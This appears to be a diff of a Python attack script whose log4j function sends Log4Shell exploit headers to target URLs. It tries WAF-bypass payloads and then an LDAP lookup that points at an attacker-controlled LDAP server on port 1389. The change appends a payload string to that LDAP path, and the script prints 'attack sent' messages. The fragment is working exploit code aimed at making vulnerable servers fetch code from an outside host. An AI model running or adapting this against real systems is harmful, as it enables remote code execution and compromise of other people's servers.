@@ -271,7 +271,7 @@ def log4j(URL=None):
                     requests.get(i, headers=generate_headers(wafPayload), verify=False, timeout=10)
                     formSubmit(i, wafPayload)
 
-                requests.get(i, headers=generate_headers(f"ldap://{attackerLDAP}"), verify=False, timeout=10)
+                requests.get(i, headers=generate_headers(f"ldap://{attackerLDAP}/{payload_string}"), verify=False, timeout=10)
                 cprint(f"LDAP port 1389 attack sent to: {i}", "magenta")
                  
             except Exception as e:
@@ -306,7 +306,7 @@ def log4j(URL=None):
                 formSubmit(URL, wafPayload)
 
 
-            requests.get(URL, headers=generate_headers(f"ldap://{attackerLDAP}"), verify=False, timeout=10)
+            requests.get(URL, headers=generate_headers(f"ldap://{attackerLDAP}/{payload_string}"), verify=False, timeout=10)
             cprint(f"LDAP 1389 attack sent to: {URL}", "magenta")
 
         except Exception as e:
